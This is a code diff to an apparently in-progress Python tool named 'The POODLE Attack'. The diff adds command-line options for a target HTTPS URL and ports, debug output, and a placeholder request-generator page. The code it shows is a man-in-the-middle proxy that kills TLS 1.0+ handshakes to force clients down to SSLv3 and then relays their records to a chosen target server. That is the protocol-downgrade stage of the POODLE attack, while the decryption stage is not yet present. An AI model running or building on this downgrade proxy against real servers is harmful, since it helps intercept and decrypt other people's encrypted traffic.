@@ -15,6 +15,9 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
+import argparse
+from urllib.parse import urlparse
+import sys
 import socket
 import socketserver
 import http.server
@@ -23,13 +26,8 @@ import select
 from multiprocessing import Process, Queue
 
 ### Configuration ###
-listenHost = "localhost"
-tlsPort = 8443
-serverHost = "localhost"
-serverPort = 4433
-httpPort = 8080
+# select() timeout
 timeout = 30.0
-#####################
 
 ### TLS/SSL ###
 class TLSRecord:
@@ -47,15 +45,17 @@ class TLSRecord:
 
 class SSLTLSHandler(socketserver.BaseRequestHandler):
     def handle(self):
-        print("Received connection from {}".format(self.client_address[0]))
+        print_debug("Received connection from {}".format(self.client_address[0]))
         tlsRecord = TLSRecord(self.request)
         if (tlsRecord.contentType == 0x16 and tlsRecord.majorVersion == 0x03 and tlsRecord.minorVersion > 0x00):       # TLS >= 1.0 handshake -> kill it to degrade!
-            print("Protocol minor version {:d} - trying to degrade.".format(tlsRecord.minorVersion))
+            print_debug("Protocol minor version {:d} - trying to degrade.".format(tlsRecord.minorVersion))
             return
+        else:
+            print_debug("Client uses SSLv3")
         
         try:
             self.forward = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.forward.connect((serverHost, serverPort))
+            self.forward.connect((args.target_host, args.target_port))
             self.forward.sendall(tlsRecord.raw)
             while (True):
                 readable, writable, errors = select.select((self.request, self.forward), (), (self.request, self.forward), timeout)
@@ -65,7 +65,7 @@ class SSLTLSHandler(socketserver.BaseRequestHandler):
                             sockname = "client-side"
                     elif errors[0] == self.forward:
                             sockname == "server-side"
-                    print(sockname + " socket signalizes an error!")
+                    print_debug(sockname + " socket signalizes an error!")
                     break
 
                 for rsocket in readable:
@@ -82,18 +82,18 @@ class SSLTLSHandler(socketserver.BaseRequestHandler):
                         rsockname = "server"
                     
                     record = TLSRecord(rsocket)
-                    print("Forwarding TLS record type {} of length {:d} from {} to {}".format(record.textContentType, len(record.raw), rsockname, ssockname))
+                    print_debug("Forwarding TLS record type {} of length {:d} from {} to {}".format(record.textContentType, len(record.raw), rsockname, ssockname))
                     ssocket.sendall(record.raw)
                                     
         except IOError as e:
-            print("I/O error: {} ({})".format(e.strerror, e.errno))
+            print_debug("I/O error: {} ({})".format(e.strerror, e.errno))
         except TypeError:
             pass
         except StopIteration:
             pass
         finally:
             self.forward.close()
-            print("Connection closed!")
+            print_debug("Connection closed!")
 
 
 class SSLTLSProxy(socketserver.ThreadingMixIn, socketserver.TCPServer):
@@ -101,25 +101,68 @@ class SSLTLSProxy(socketserver.ThreadingMixIn, socketserver.TCPServer):
 
 ### HTTP ###
 class PoodleHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
-    pass
+    def do_GET(self):
+        if (self.path == "/"):
+            self.sendRequestGenerator()
+
+    def sendRequestGenerator(self):
+        self.send_response(200);
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.end_headers()
+        self.wfile.write(bytes("<b>POODLE Request Generator</b>", "utf-8"))
+
+    def version_string(self):
+        return "POODLE Request Generator"
 
 ### Functions ###
 def ssltlsServer(queue):
     print("Starting SSL/TLS server")
-    server = SSLTLSProxy((listenHost, tlsPort), SSLTLSHandler)
-    server.serve_forever()
+    server = SSLTLSProxy((args.listen_host, int(args.listen_port_tls)), SSLTLSHandler)
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print("Shutdown of SSL/TLS server on user request")
 
 def httpServer(queue):
     print("Starting HTTP server")
-    server = http.server.HTTPServer((listenHost, httpPort), PoodleHTTPRequestHandler)
-    server.serve_forever()
+    server = http.server.HTTPServer((args.listen_host, int(args.listen_port_http)), PoodleHTTPRequestHandler)
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print("Shutdown of HTTP server on user request")
+
+def print_debug(msg):
+    if (args.debug):
+        print(msg)
 
 ### Main ###
+argparser = argparse.ArgumentParser(description="The POODLE Attack")
+argparser.add_argument("targetURL", help="Target URL. Requests are performed against this URL and TLS forwardings are derived from this.")
+argparser.add_argument("--listen-host", "-lh", default="", help="TLS/SSL and HTTP listening host")
+argparser.add_argument("--listen-port-tls", "-lpt", default="8443", help="TLS/SSL listening port")
+argparser.add_argument("--listen-port-http", "-lph", default="8000", help="HTTP listening port")
+argparser.add_argument("--target-host", "-th", default=None, help="Target host override, normally derived from target URL")
+argparser.add_argument("--target-port", "-tp", default=None, help="Target port override, normally derived from target URL")
+argparser.add_argument("--debug", "-d", action="store_true", help="Debugging output")
+args = argparser.parse_args()
+targetURL = urlparse(args.targetURL)
+args.target_host = args.target_host or targetURL.hostname
+args.target_port = args.target_port or targetURL.port or 443
+if (targetURL.scheme != "https"):
+    print("Target must be HTTPS URL!");
+    sys.exit(1)
+if (args.target_host == None):
+    print("Can't determine target host!");
+    sys.exit(2)
+
 commandQueue = Queue()
 poodleSSLTLSServer = Process(target=ssltlsServer, args=(commandQueue,))
 poodleSSLTLSServer.start()
 poodleHTTPServer = Process(target=httpServer, args=(commandQueue,))
 poodleHTTPServer.start()
 
-poodleSSLTLSServer.join()
-poodleHTTPServer.join()
+try:
+    poodleSSLTLSServer.join()
+    poodleHTTPServer.join()
+except KeyboardInterrupt:
+    print("Bye!")
